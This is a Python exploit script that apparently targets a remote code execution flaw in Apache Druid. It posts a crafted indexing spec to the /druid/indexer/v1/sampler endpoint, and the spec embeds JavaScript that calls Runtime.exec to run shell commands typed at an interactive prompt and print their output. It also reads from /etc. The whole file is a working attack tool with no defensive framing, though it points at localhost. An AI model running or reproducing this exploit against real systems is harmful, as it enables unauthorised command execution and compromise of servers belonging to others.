import requests, json

def print_menu():
    print('''You've exploited RCE vulnerability of Apache Druid.
    Please select any options:
    [1] enter valid shell command
    [2] exit''')

def send_request(payload):
    url = "http://localhost:8888/druid/indexer/v1/sampler"

    headers = {
        "Accept-Encoding": "gzip, deflate",
        "Accept": "*/*",
        "Accept-Language": "en-US;q=0.9,en;q=0.8",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36",
        "Connection": "close",
        "Cache-Control": "max-age=0",
        "Content-Type": "application/json"
    }

    data = {
        "type": "index",
        "spec": {
            "ioConfig": {
                "type": "index",
                "firehose": {
                    "type": "local",
                    "baseDir": "/etc",
                    "filter": "passwd"
                }
            },
            "dataSchema": {
                "dataSource": "test",
                "parser": {
                    "parseSpec": {
                        "format": "javascript",
                        "timestampSpec": {},
                        "dimensionsSpec": {},
                        "function": 'function(){var a = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(["sh","-c","'+payload+'"]).getInputStream()).useDelimiter("\\A").next();return {timestamp:123123,test: a}}',
                        "": {
                            "enabled": "true"
                        }
                    }
                }
            }
        },
        "samplerConfig": {
            "numRows": 10
        }
    }

    c = requests.post(url, headers=headers, json=data)
    parsed_res = json.loads(c.text)
    rce_result = parsed_res['data'][0]['input']['test']
    print(rce_result.strip()+"\n")


while True:
    print_menu()
    try:
        menu = int(input("> "))
        if menu==1:
            payload = input("command: ").strip()
            
            send_request(payload)
        elif menu==2:
            break
        else:
            print("invalid menu\n")
            continue
    except ValueError:
        print("invalid menu\n")
        continue

print("Good Bye~~")